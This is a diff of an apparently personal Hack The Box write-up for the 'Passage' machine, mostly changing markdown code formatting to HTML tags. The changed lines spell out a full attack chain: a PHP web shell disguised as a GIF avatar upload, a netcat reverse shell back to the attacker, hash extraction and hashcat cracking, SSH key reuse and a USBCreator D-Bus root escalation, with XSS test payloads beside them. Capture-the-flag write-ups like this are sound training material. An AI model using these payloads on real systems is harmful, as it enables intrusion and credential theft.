@@ -9,31 +9,31 @@ This machine is currently active, and is my first attempt at HTB.  Its IP addres
 
 # The Short Version
 <ol>
-	<li>Run `nmap -sC -sV 10.10.10.206` to get the open ports;</li>
-	<li> Run `echo "10.10.10.206    passage" | sudo tee -a /etc/hosts` to get a nicer way to reference the machine;</li>
-	<li>Go to `http://passage:80` on your browser.  Notice it uses CuteNews;</li>
- 	<li>Go to `http://passage:80/CuteNews/` and create an account;</li>
+	<li>Run <code>nmap -sC -sV 10.10.10.206</code> to get the open ports;</li>
+	<li> Run <code>echo "10.10.10.206    passage" | sudo tee -a /etc/hosts</code> to get a nicer way to reference the machine;</li>
+	<li>Go to <code>http://passage:80</code> on your browser.  Notice it uses CuteNews;</li>
+ 	<li>Go to <code>http://passage:80/CuteNews/</code> and create an account;</li>
 	<li>Edit your account by uploading an avatar "photo", which is really just a file containing:
-```php
+<pre><code>
 GIF8;
 <?php system($_REQUEST['cmd']) ?>
-```
+</pre></code>
 </li>
-	<li>Go to `http://passage:80/CuteNews/uploads/`, and click on your recently uploaded PHP file;</li>
-	<li>Run `nc -nlvp 1234` in a terminal window;</li>
-	<li>Get the IP address of your `tun0` interface: `ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'`;</li>
-	<li>Append the URL of your upload with `?cmd=nc -e /bin/bash <IP from step 8> 1234`;</li>
-	<li>Go back to your terminal and run `python3 -c 'import pty; pty.spawn("/bin/bash")'` to gain access to a shell;</li>
-	<li>Now that you have access, you need some passwords.  There are some hashed passwords, encoded using `base64`, in the `/var/www/html/CuteNews/cdata/users/` directory.  You will need to get each of their hashes where possible: you can do some *quick and dirty* bash parsing to get the usernames and hashes:
-```bash
+	<li>Go to <code>http://passage:80/CuteNews/uploads/</code>, and click on your recently uploaded PHP file;</li>
+	<li>Run <code>nc -nlvp 1234</code> in a terminal window;</li>
+	<li>Get the IP address of your <code>tun0</code> interface: <code>ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'</code>;</li>
+	<li>Append the URL of your upload with <code>?cmd=nc -e /bin/bash <IP from step 8> 1234</code>;</li>
+	<li>Go back to your terminal and run <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> to gain access to a shell;</li>
+	<li>Now that you have access, you need some passwords.  There are some hashed passwords, encoded using <code>base64</code>, in the <code>/var/www/html/CuteNews/cdata/users/</code> directory.  You will need to get each of their hashes where possible: you can do some *quick and dirty* bash parsing to get the usernames and hashes:
+<pre><code>
 for i in /var/www/html/CuteNews/cdata/users/*.php; do DECODED="$(tail -n 1 "$i" | base64 -d 2>/dev/null)"; RET_VAL=$?; if [ $RET_VAL -eq 0 ]; then HASH="$(echo "$DECODED" | awk -F'64:' '{print $2}' | awk -F';' '{print $1}' | tr -d '"' | sed '/^$/d')"; if [[ ! -z "${HASH}" ]]; then NAME="$(echo "$DECODED" | awk -F'"email"' '{print $2}' | awk -F'@' '{print $1}' | awk -F'"' '{print $2}' | tr -d '"' | sed '/^$/d')"; echo -e "${NAME}\n${HASH}\n"; fi; fi; done
-```
-You could also parse the `/var/www/html/CuteNews/cdata/users/lines` file using `while read`, as I think that has the same content;</li>
-	<li>You will now need to choose a hash and decode it.  For me, `paul`'s hash worked.  I checked `hash-identify` to see that it was likely `SHA-256`, and thus ran `hashcat -a 0 -m 1400 "$OUR_HASH" /usr/share/wordlists/rockyou.txt && hashcat --show -m 1400 "$OUR_HASH"`: we see the password is `atlanta1`.  (Thank you, Paul, for having a terrible password);</li>
-	<li>Login as Paul; `su paul`&mdash;using the password we found above.  Capture an intermediate flag: `cat ~/user.txt`;</li>
-	<li>As Paul seems to have access to admin's (`nadav`'s) account via `ssh`, we can run `ssh -i ~/.ssh/id_rsa nadav@passage`; now we are pretending to be `nadav`;</li>
-	<li>Now we are admin, making use of a vulnerability in the USBCreator D-Bus interface that allows privilege escalation, we can gain root access to this machine by running `cd /tmp && gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true && ssh -i pwn root@passage`;</li>
-	<li>Capture the "flag": `cat /root/root.txt`.</li>
+</pre></code>
+You could also parse the <code>/var/www/html/CuteNews/cdata/users/lines</code> file using <code>while read</code>, as I think that has the same content;</li>
+	<li>You will now need to choose a hash and decode it.  For me, <code>paul</code>'s hash worked.  I checked <code>hash-identify</code> to see that it was likely <code>SHA-256</code>, and thus ran <code>hashcat -a 0 -m 1400 "$OUR_HASH" /usr/share/wordlists/rockyou.txt && hashcat --show -m 1400 "$OUR_HASH"</code>: we see the password is <code>atlanta1</code>.  (Thank you, Paul, for having a terrible password);</li>
+	<li>Login as Paul; <code>su paul</code>&mdash;using the password we found above.  Capture an intermediate flag: <code>cat ~/user.txt</code>;</li>
+	<li>As Paul seems to have access to admin's (<code>nadav</code>'s) account via <code>ssh</code>, we can run <code>ssh -i ~/.ssh/id_rsa nadav@passage</code>; now we are pretending to be <code>nadav</code>;</li>
+	<li>Now we are admin, making use of a vulnerability in the USBCreator D-Bus interface that allows privilege escalation, we can gain root access to this machine by running <code>cd /tmp && gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true && ssh -i pwn root@passage</code>;</li>
+	<li>Capture the "flag": <code>cat /root/root.txt</code>.</li>
 </ol>
 
 # The Long (Verbatim) Version
@@ -48,7 +48,7 @@ Host is up (0.70s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
 |   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
 |_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
@@ -87,10 +87,10 @@ This page is a news page.  The only news article here that is not in Latin is na
 I click on this and this is the body:
 
 ```
-Due to unusally large amounts of traffic, we have implementated Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection. View & Comment 
+Due to unusally large amounts of traffic, we have implementated Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection. View & Comment
 ```
 
-There is a comments box.  My very first thought was SQL Injections, but then I was reminded of PHP, so I tried commenting something using PHP.  Nothing happened (though the comment did go through).  Then I tried JavaScript, as one of the comments wrote 
+There is a comments box.  My very first thought was SQL Injections, but then I was reminded of PHP, so I tried commenting something using PHP.  Nothing happened (though the comment did go through).  Then I tried JavaScript, as one of the comments wrote
 ```html
 <script>alert(5)</script>
 ```
@@ -99,7 +99,7 @@ However, after attempting to write
 ```html
 <script>console.log("Test")</script>
 ```
-The page broke, and I had to go back to the main page, at which point both comments previously there were gone.  I cannot recall what the first comment had said.  I have no idea why 
+The page broke, and I had to go back to the main page, at which point both comments previously there were gone.  I cannot recall what the first comment had said.  I have no idea why
 
 I also noted that the admin who posted this has the link to an email address: `nadav@passave.htb`.  This might, I think, come in handy with the other open port: `ssh`.
 
@@ -120,10 +120,10 @@ I went back to my Google search and found [this](https://github.com/mt-code/CVE-
 
 
 
-           _____     __      _  __                     ___   ___  ___ 
+           _____     __      _  __                     ___   ___  ___
           / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
-         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
-         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
+         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
+         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                 ___  _________                        
                                / _ \/ ___/ __/                        
                               / , _/ /__/ _/                          
@@ -525,7 +525,7 @@ ssh -i id_rsa nadav@passage
 
 This gives me access to `nadav` (admin's) account without needing his password, as the RSA key Paul has works!
 
-This is great; we have admin access to this machine.  Now what I need to do is just remember what exactly we are supposed to be doing...  That's right; we need `root` access *specifically*; not just admin access.  After some Googling, it looks like there is [a vulnerability in the USBCreator D-Bus interface that allows privilege escalation using](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) 
+This is great; we have admin access to this machine.  Now what I need to do is just remember what exactly we are supposed to be doing...  That's right; we need `root` access *specifically*; not just admin access.  After some Googling, it looks like there is [a vulnerability in the USBCreator D-Bus interface that allows privilege escalation using](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
 ```bash
 cd /tmp && gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true
